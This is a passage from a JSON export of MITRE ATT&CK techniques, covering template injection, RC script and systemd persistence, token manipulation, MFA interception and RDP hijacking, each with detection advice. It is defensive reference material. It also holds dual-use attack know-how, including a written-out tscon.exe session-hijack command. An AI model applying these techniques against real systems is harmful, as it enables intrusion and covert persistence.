      "description": "Adversaries may scan victim IP blocks to gather information that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses.\n\nAdversaries may scan IP blocks in order to [Gather Victim Network Information](https://attack.mitre.org/techniques/T1590), such as which IP addresses are actively in use as well as more detailed information about hosts assigned these addresses. Scans may range from simple pings (ICMP requests and responses) to more nuanced scans that may reveal host software/versions via server banners or other network artifacts.(Citation: Botnet Scan) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1595.001",
      "stix_id": "attack-pattern--db8f5003-3b20-48f0-9b76-123e44208120",
      "created": "2020-10-02T16:54:23.193000+00:00",
      "modified": "2025-04-15T23:02:44.660000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content",
        "Network Traffic: Network Traffic Flow"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for suspicious network traffic that could be indicative of scanning, such as large quantities originating from a single source (especially if the source is known to be associated with an adversary/botnet).\n\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    },
    "T1221": {
      "id": "T1221",
      "name": "Template Injection",
      "description": "Adversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts. For example, Microsoft\u2019s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered.(Citation: Microsoft Open XML July 2017)\n\nProperties within parts may reference shared public resources accessed via online URLs. For example, template properties may reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.\n\nAdversaries may abuse these templates to initially conceal malicious code to be executed via user documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded.(Citation: SANS Brian Wiltse Template Injection) These documents can be delivered via other techniques such as [Phishing](https://attack.mitre.org/techniques/T1566) and/or [Taint Shared Content](https://attack.mitre.org/techniques/T1080) and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched.(Citation: Redxorblue Remote Template Injection) Examples have been seen in the wild where template injection was used to load malicious code containing an exploit.(Citation: MalwareBytes Template Injection OCT 2017)\n\nAdversaries may also modify the <code>*\\template</code> control word within an .rtf file to similarly conceal then download malicious code. This legitimate control word value is intended to be a file destination of a template file resource that is retrieved and loaded when an .rtf file is opened. However, adversaries may alter the bytes of an existing .rtf file to insert a template control word field to include a URL resource of a malicious payload.(Citation: Proofpoint RTF Injection)(Citation: Ciberseguridad Decoding malicious RTF files)\n\nThis technique may also enable [Forced Authentication](https://attack.mitre.org/techniques/T1187) by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt.(Citation: Anomali Template Injection MAR 2018)(Citation: Talos Template Injection July 2017)(Citation: ryhanson phishery SEPT 2016)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1221",
      "stix_id": "attack-pattern--dc31fe1e-d722-49da-8f5f-92c7b5aff534",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T15:16:15.516000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Connection Creation",
        "Process: Process Creation",
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
      "detection": "Analyze process behavior to determine if user document applications (such as Office) are performing actions, such as opening network connections, reading files, spawning abnormal child processes (ex: [PowerShell](https://attack.mitre.org/techniques/T1059/001)), or other suspicious actions that could relate to post-compromise behavior.\n\nMonitor .rtf files for strings indicating the <code>&#42;\\template</code> control word has been modified to retrieve a URL resource, such as <code>&#42;\\template http</code> or <code>&#42;\\template \\u-</code>."
    },
    "T1037.004": {
      "id": "T1037.004",
      "name": "RC Scripts",
      "description": "Adversaries may establish persistence by modifying RC scripts, which are executed during a Unix-like system\u2019s startup. These files allow system administrators to map and start custom services at startup for different run levels. RC scripts require root privileges to modify.\n\nAdversaries may establish persistence by adding a malicious binary path or shell commands to <code>rc.local</code>, <code>rc.common</code>, and other RC scripts specific to the Unix-like distribution.(Citation: IranThreats Kittens Dec 2017)(Citation: Intezer HiddenWasp Map 2019) Upon reboot, the system executes the script's contents as root, resulting in persistence.\n\nAdversary abuse of RC scripts is especially effective for lightweight Unix-like distributions using the root user as default, such as ESXi hypervisors, IoT, or embedded systems.(Citation: intezer-kaiji-malware) As ESXi servers store most system files in memory and therefore discard changes on shutdown, leveraging `/etc/rc.local.d/local.sh` is one of the few mechanisms for enabling persistence across reboots.(Citation: Juniper Networks ESXi Backdoor 2022)\n\nSeveral Unix-like systems have moved to Systemd and deprecated the use of RC scripts. This is now a deprecated mechanism in macOS in favor of [Launchd](https://attack.mitre.org/techniques/T1053/004).(Citation: Apple Developer Doco Archive Launchd)(Citation: Startup Items) This technique can be used on Mac OS X Panther v10.3 and earlier versions which still execute the RC scripts.(Citation: Methods of Mac Malware Persistence) To maintain backwards compatibility some systems, such as Ubuntu, will execute the RC scripts if they exist with the correct file permissions.(Citation: Ubuntu Manpage systemd rc)",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1037.004",
      "stix_id": "attack-pattern--dca670cf-eeec-438f-8185-fd959d9ef211",
      "created": "2020-01-15T16:25:22.260000+00:00",
      "modified": "2025-04-15T19:59:13.566000+00:00",
      "platforms": [
        "macOS",
        "Linux",
        "Network Devices",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Creation",
        "Process: Process Creation",
        "File: File Modification",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for unexpected changes to RC scripts in the <code>/etc/</code> directory. Monitor process execution resulting from RC scripts for unusual or unknown applications or behavior.\n\nMonitor for <code>/etc/rc.local</code> file creation. Although types of RC scripts vary for each Unix-like distribution, several execute <code>/etc/rc.local</code> if present. "
    },
    "T1134": {
      "id": "T1134",
      "name": "Access Token Manipulation",
      "description": "Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.\n\nAn adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)) or used to spawn a new process (i.e. [Create Process with Token](https://attack.mitre.org/techniques/T1134/002)). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.(Citation: Pentestlab Token Manipulation)\n\nAny standard user can use the <code>runas</code> command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1134",
      "stix_id": "attack-pattern--dcaa092b-7de9-4a21-977f-7fcb77e89c48",
      "created": "2017-12-14T16:46:06.044000+00:00",
      "modified": "2025-04-16T20:37:21.869000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: OS API Execution",
        "Command: Command Execution",
        "User Account: User Account Metadata",
        "Process: Process Metadata",
        "Process: Process Creation",
        "Active Directory: Active Directory Object Modification"
      ],
      "defense_bypassed": [],
      "detection": "If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)\n\nIf an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior. \n\nThere are many Windows API calls a payload can take advantage of to manipulate access tokens (e.g., <code>LogonUser</code> (Citation: Microsoft LogonUser), <code>DuplicateTokenEx</code>(Citation: Microsoft DuplicateTokenEx), and <code>ImpersonateLoggedOnUser</code>(Citation: Microsoft ImpersonateLoggedOnUser)). Please see the referenced Windows API pages for more information.\n\nQuery systems for process and thread token information and look for inconsistencies such as user owns processes impersonating the local SYSTEM account.(Citation: BlackHat Atkinson Winchester Token Manipulation)\n\nLook for inconsistencies between the various fields that store PPID information, such as the EventHeader ProcessId from data collected via Event Tracing for Windows (ETW), Creator Process ID/Name from Windows event logs, and the ProcessID and ParentProcessID (which are also produced from ETW and other utilities such as Task Manager and Process Explorer). The ETW provided EventHeader ProcessId identifies the actual parent process."
    },
    "T1111": {
      "id": "T1111",
      "name": "Multi-Factor Authentication Interception",
      "description": "Adversaries may target multi-factor authentication (MFA) mechanisms, (i.e., smart cards, token generators, etc.) to gain access to credentials that can be used to access systems, services, and network resources. Use of MFA is recommended and provides a higher level of security than usernames and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. \n\nIf a smart card is used for multi-factor authentication, then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token. (Citation: Mandiant M Trends 2011)\n\nAdversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes). (Citation: GCN RSA June 2011)\n\nOther methods of MFA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Service providers can also be targeted: for example, an adversary may compromise an SMS messaging service in order to steal MFA codes sent to users\u2019 phones.(Citation: Okta Scatter Swine 2022)",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1111",
      "stix_id": "attack-pattern--dd43c543-bb85-4a6f-aa6e-160d90d06a49",
      "created": "2017-05-31T21:31:23.195000+00:00",
      "modified": "2025-04-15T22:50:08.274000+00:00",
      "platforms": [
        "Linux",
        "Windows",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Driver: Driver Load",
        "Process: OS API Execution",
        "Windows Registry: Windows Registry Key Modification"
      ],
      "defense_bypassed": [],
      "detection": "Detecting use of proxied smart card connections by an adversary may be difficult because it requires the token to be inserted into a system; thus it is more likely to be in use by a legitimate user and blend in with other network behavior.\n\nSimilar to [Input Capture](https://attack.mitre.org/techniques/T1056), keylogging activity can take various forms but can may be detected via installation of a driver, setting a hook, or usage of particular API calls associated with polling to intercept keystrokes."
    },
    "T1027.002": {
      "id": "T1027.002",
      "name": "Software Packing",
      "description": "Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.(Citation: ESET FinFisher Jan 2018) \n\nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.(Citation: Awesome Executable Packing)  ",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1027.002",
      "stix_id": "attack-pattern--deb98323-e13f-4b0c-8d94-175379069062",
      "created": "2020-02-05T14:17:46.686000+00:00",
      "modified": "2025-04-16T20:37:22.038000+00:00",
      "platforms": [
        "macOS",
        "Windows",
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Metadata"
      ],
      "defense_bypassed": [],
      "detection": "Use file scanning to look for known software packers or artifacts of packing techniques. Packing is not a definitive indicator of malicious activity, because legitimate software may use packing techniques to reduce binary size or to protect proprietary code."
    },
    "T1584.007": {
      "id": "T1584.007",
      "name": "Serverless",
      "description": "Adversaries may compromise serverless cloud infrastructure, such as Cloudflare Workers, AWS Lambda functions, or Google Apps Scripts, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them. \n\nOnce compromised, the serverless runtime environment can be leveraged to either respond directly to infected machines or to [Proxy](https://attack.mitre.org/techniques/T1090) traffic to an adversary-owned command and control server.(Citation: BlackWater Malware Cloudflare Workers)(Citation: AWS Lambda Redirector)(Citation: GWS Apps Script Abuse 2021) As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers - making it easier to [Hide Infrastructure](https://attack.mitre.org/techniques/T1665).(Citation: Detecting Command & Control in the Cloud)(Citation: BlackWater Malware Cloudflare Workers)",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1584.007",
      "stix_id": "attack-pattern--df1bc34d-1634-4c93-b89e-8120994fce77",
      "created": "2022-07-08T12:46:15.450000+00:00",
      "modified": "2025-04-15T23:06:14.037000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Internet Scan: Response Content"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1071.001": {
      "id": "T1071.001",
      "name": "Web Protocols",
      "description": "Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S(Citation: CrowdStrike Putter Panda) and WebSocket(Citation: Brazking-Websockets) that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1071.001",
      "stix_id": "attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161",
      "created": "2020-03-15T16:13:46.151000+00:00",
      "modified": "2025-04-15T19:59:14.227000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Network Devices",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content",
        "Network Traffic: Network Traffic Flow"
      ],
      "defense_bypassed": [],
      "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)\n\nMonitor for web traffic to/from known-bad or suspicious domains. "
    },
    "T1059.005": {
      "id": "T1059.005",
      "name": "Visual Basic",
      "description": "Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and the [Native API](https://attack.mitre.org/techniques/T1106) through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.(Citation: VB .NET Mar 2020)(Citation: VB Microsoft)\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications.(Citation: Microsoft VBA)(Citation: Wikipedia VBA) VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of [JavaScript](https://attack.mitre.org/techniques/T1059/007) on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).(Citation: Microsoft VBScript)\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) payloads (which may also involve [Mark-of-the-Web Bypass](https://attack.mitre.org/techniques/T1553/005) to enable execution).(Citation: Default VBS macros Blocking )",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1059.005",
      "stix_id": "attack-pattern--dfd7cc1d-e1d8-4394-a198-97c4cab8aa67",
      "created": "2020-03-09T14:29:51.508000+00:00",
      "modified": "2025-04-15T19:59:14.314000+00:00",
      "platforms": [
        "Windows",
        "macOS",
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "Module: Module Load",
        "Command: Command Execution",
        "Process: Process Creation",
        "Script: Script Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for events associated with VB execution, such as Office applications spawning processes, usage of the Windows Script Host (typically cscript.exe or wscript.exe), file activity involving VB payloads or scripts, or loading of modules associated with VB languages (ex: vbscript.dll). VB execution is likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for execution and subsequent behavior. Actions may be related to network and system information [Discovery](https://attack.mitre.org/tactics/TA0007), [Collection](https://attack.mitre.org/tactics/TA0009), or other programable post-compromise behaviors and could be used as indicators of detection leading back to the source.\n\nUnderstanding standard usage patterns is important to avoid a high number of false positives. If VB execution is restricted for normal users, then any attempts to enable related components running on a system would be considered suspicious. If VB execution is not commonly used on a system, but enabled, execution running out of cycle from patching or other administrator functions is suspicious. Payloads and scripts should be captured from the file system when possible to determine their actions and intent."
    },
    "T1564.005": {
      "id": "T1564.005",
      "name": "Hidden File System",
      "description": "Adversaries may use a hidden file system to conceal malicious activity from users and security tools. File systems provide a structure to store and access data from physical storage. Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector). Standard file systems include FAT, NTFS, ext4, and APFS. File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS.(Citation: MalwareTech VFS Nov 2014)\n\nAdversaries may use their own abstracted file system, separate from the standard file system present on the infected system. In doing so, adversaries can hide the presence of malicious components and file input/output from security tools. Hidden file systems, sometimes referred to as virtual file systems, can be implemented in numerous ways. One implementation would be to store a file system in reserved disk space unused by disk structures or standard file system partitions.(Citation: MalwareTech VFS Nov 2014)(Citation: FireEye Bootkits) Another implementation could be for an adversary to drop their own portable partition image as a file on top of the standard file system.(Citation: ESET ComRAT May 2020) Adversaries may also fragment files across the existing file system structure in non-standard ways.(Citation: Kaspersky Equation QA)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1564.005",
      "stix_id": "attack-pattern--dfebc3b7-d19d-450b-81c7-6dafe4184c04",
      "created": "2020-06-28T22:55:55.719000+00:00",
      "modified": "2025-04-25T14:48:18.639000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Firmware: Firmware Modification",
        "File: File Modification",
        "Windows Registry: Windows Registry Key Modification"
      ],
      "defense_bypassed": [],
      "detection": "Detecting the use of a hidden file system may be exceptionally difficult depending on the implementation. Emphasis may be placed on detecting related aspects of the adversary lifecycle, such as how malware interacts with the hidden file system or how a hidden file system is loaded. Consider looking for anomalous interactions with the Registry or with a particular file on disk. Likewise, if the hidden file system is loaded on boot from reserved disk space, consider shifting focus to detecting [Bootkit](https://attack.mitre.org/techniques/T1542/003) activity."
    },
    "T1543.002": {
      "id": "T1543.002",
      "name": "Systemd Service",
      "description": "Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. Systemd is a system and service manager commonly used for managing background daemon processes (also known as services) and other system resources.(Citation: Linux man-pages: systemd January 2014) Systemd is the default initialization (init) system on many Linux distributions replacing legacy init systems, including SysVinit and Upstart, while remaining backwards compatible.  \n\nSystemd utilizes unit configuration files with the `.service` file extension to encode information about a service's process. By default, system level unit files are stored in the `/systemd/system` directory of the root owned directories (`/`). User level unit files are stored in the `/systemd/user` directories of the user owned directories (`$HOME`).(Citation: lambert systemd 2022) \n\nInside the `.service` unit files, the following directives are used to execute commands:(Citation: freedesktop systemd.service)  \n\n* `ExecStart`, `ExecStartPre`, and `ExecStartPost` directives execute when a service is started manually by `systemctl` or on system start if the service is set to automatically start.\n* `ExecReload` directive executes when a service restarts. \n* `ExecStop`, `ExecStopPre`, and `ExecStopPost` directives execute when a service is stopped.  \n\nAdversaries have created new service files, altered the commands a `.service` file\u2019s directive executes, and modified the user directive a `.service` file executes as, which could result in privilege escalation. Adversaries may also place symbolic links in these directories, enabling systemd to find these payloads regardless of where they reside on the filesystem.(Citation: Anomali Rocke March 2019)(Citation: airwalk backdoor unix systems)(Citation: Rapid7 Service Persistence 22JUNE2016) \n\nThe `.service` file\u2019s User directive can be used to run service as a specific user, which could result in privilege escalation based on specific user/group permissions. \n\nSystemd services can be created via systemd generators, which support the dynamic generation of unit files. Systemd generators are small executables that run during boot or configuration reloads to dynamically create or modify systemd unit files by converting non-native configurations into services, symlinks, or drop-ins (i.e., [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037)).(Citation: Elastic Security Labs Linux Persistence 2024)(Citation: Pepe Berba Systemd 2022)",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1543.002",
      "stix_id": "attack-pattern--dfefe2ed-4389-4318-8762-f0272b350a1b",
      "created": "2020-01-17T16:15:19.870000+00:00",
      "modified": "2025-04-15T19:59:14.487000+00:00",
      "platforms": [
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "File: File Modification",
        "Service: Service Creation",
        "Service: Service Modification",
        "Process: Process Creation",
        "File: File Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor file creation and modification events of Systemd service unit configuration files in the default directory locations for `root` & `user` level permissions. Suspicious processes or scripts spawned in this manner will have a parent process of \u2018systemd\u2019, a parent process ID of 1, and will usually execute as the `root` user.(Citation: lambert systemd 2022) \n\nSuspicious systemd services can also be identified by comparing results against a trusted system baseline. Malicious systemd services may be detected by using the systemctl utility to examine system wide services: `systemctl list-units -\u2013type=service \u2013all`. Analyze the contents of `.service` files present on the file system and ensure that they refer to legitimate, expected executables, and symbolic links.(Citation: Berba hunting linux systemd)\n\nAuditing the execution and command-line arguments of the `systemctl` utility, as well related utilities such as `/usr/sbin/service` may reveal malicious systemd service execution."
    },
    "T1668": {
      "id": "T1668",
      "name": "Exclusive Control",
      "description": "Adversaries who successfully compromise a system may attempt to maintain persistence by \u201cclosing the door\u201d behind them  \u2013 in other words, by preventing other threat actors from initially accessing or maintaining a foothold on the same system. \n\nFor example, adversaries may patch a vulnerable, compromised system(Citation: Mandiant-iab-control)(Citation: CERT AT Fortinent Ransomware 2025) to prevent other threat actors from leveraging that vulnerability in the future. They may \u201cclose the door\u201d in other ways, such as disabling vulnerable services(Citation: sophos-multiple-attackers), stripping privileges from accounts(Citation: aquasec-postgres-processes), or removing other malware already on the compromised device.(Citation: fsecure-netsky)\n\nHindering other threat actors may allow an adversary to maintain sole access to a compromised system or network. This prevents the threat actor from needing to compete with or even being removed themselves by other threat actors. It also reduces the \u201cnoise\u201d in the environment, lowering the possibility of being caught and evicted by defenders. Finally, in the case of [Resource Hijacking](https://attack.mitre.org/techniques/T1496), leveraging a compromised device\u2019s full power allows the threat actor to maximize profit.(Citation: sophos-multiple-attackers)",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1668",
      "stix_id": "attack-pattern--dff263cc-328e-42b4-afbc-1fee8b6a8913",
      "created": "2025-01-31T15:22:39.317000+00:00",
      "modified": "2025-04-15T19:59:14.622000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Termination",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1563.002": {
      "id": "T1563.002",
      "name": "RDP Hijacking",
      "description": "Adversaries may hijack a legitimate user\u2019s remote desktop session to move laterally within an environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services)\n\nAdversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console, `c:\\windows\\system32\\tscon.exe [session number to be stolen]`, an adversary can hijack a session without the need for credentials or prompts to the user.(Citation: RDP Hijacking Korznikov) This can be done remotely or locally and with active or disconnected sessions.(Citation: RDP Hijacking Medium) It can also lead to [Remote System Discovery](https://attack.mitre.org/techniques/T1018) and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools.(Citation: Kali Redsnarf)",
      "tactic": "lateral-movement",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1563.002",
      "stix_id": "attack-pattern--e0033c16-a07e-48aa-8204-7c3ca669998c",
      "created": "2020-02-25T18:35:42.765000+00:00",
      "modified": "2025-04-15T22:59:04.979000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Logon Session: Logon Session Creation",
        "Process: Process Creation",
        "Command: Command Execution",
        "Network Traffic: Network Traffic Flow",
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
      "detection": "Consider monitoring processes for `tscon.exe` usage and monitor service creation that uses `cmd.exe /k` or `cmd.exe /c` in its arguments to detect RDP session hijacking.\n\nUse of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP."
    },
    "T1136": {
      "id": "T1136",
      "name": "Create Account",
      "description": "Adversaries may create an account to maintain access to victim systems.(Citation: Symantec WastedLocker June 2020) With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.\n\nAccounts may be created on the local system or within a domain or cloud tenant. In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection.",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1136",
      "stix_id": "attack-pattern--e01be9c5-e763-4caf-aeb7-000b416aef67",
      "created": "2017-12-14T16:46:06.044000+00:00",
      "modified": "2025-04-15T19:59:14.796000+00:00",
      "platforms": [
        "Windows",
        "IaaS",
        "Linux",
        "macOS",
        "Network Devices",
        "Containers",
        "SaaS",
        "Office Suite",
        "Identity Provider",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Command: Command Execution",
        "User Account: User Account Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for processes and command-line parameters associated with account creation, such as <code>net user</code> or <code>useradd</code>. Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows system and domain controller. (Citation: Microsoft User Creation Event) Perform regular audits of domain and local system accounts to detect suspicious accounts that may have been created by an adversary.\n\nCollect usage logs from cloud administrator accounts to identify unusual activity in the creation of new accounts and assignment of roles to those accounts. Monitor for accounts assigned to admin roles that go over a certain threshold of known admins."
    },
    "T1547.013": {
      "id": "T1547.013",
      "name": "XDG Autostart Entries",
      "description": "Adversaries may add or modify XDG Autostart Entries to execute malicious programs or commands when a user\u2019s desktop environment is loaded at login. XDG Autostart entries are available for any XDG-compliant Linux system. XDG Autostart entries use Desktop Entry files (`.desktop`) to configure the user\u2019s desktop environment upon user login. These configuration files determine what applications launch upon user login, define associated applications to open specific file types, and define applications used to open removable media.(Citation: Free Desktop Application Autostart Feb 2006)(Citation: Free Desktop Entry Keys)\n\nAdversaries may abuse this feature to establish persistence by adding a path to a malicious binary or command to the `Exec` directive in the `.desktop` configuration file. When the user\u2019s desktop environment is loaded at user login, the `.desktop` files located in the XDG Autostart directories are automatically executed. System-wide Autostart entries are located in the `/etc/xdg/autostart` directory while the user entries are located in the `~/.config/autostart` directory.\n\nAdversaries may combine this technique with [Masquerading](https://attack.mitre.org/techniques/T1036) to blend malicious Autostart entries with legitimate programs.(Citation: Red Canary Netwire Linux 2022)",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1547.013",
      "stix_id": "attack-pattern--e0232cb0-ded5-4c2e-9dc7-2893142a5c11",
      "created": "2019-09-10T18:13:12.195000+00:00",
      "modified": "2025-04-15T19:59:14.885000+00:00",
      "platforms": [
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Creation",
        "Command: Command Execution",
        "Process: Process Creation",
        "File: File Modification"
      ],
      "defense_bypassed": [],
      "detection": "Malicious XDG autostart entries may be detected by auditing file creation and modification events within the <code>/etc/xdg/autostart</code> and <code>~/.config/autostart</code> directories. Depending on individual configurations, defenders may need to query the environment variables <code>$XDG_CONFIG_HOME</code> or <code>$XDG_CONFIG_DIRS</code> to determine the paths of Autostart entries. Autostart entry files not associated with legitimate packages may be considered suspicious. Suspicious entries can also be identified by comparing entries to a trusted system baseline.\n \nSuspicious processes or scripts spawned in this manner will have a parent process of the desktop component implementing the XDG specification and will execute as the logged on user."
    },
    "T1584.004": {
      "id": "T1584.004",
      "name": "Server",
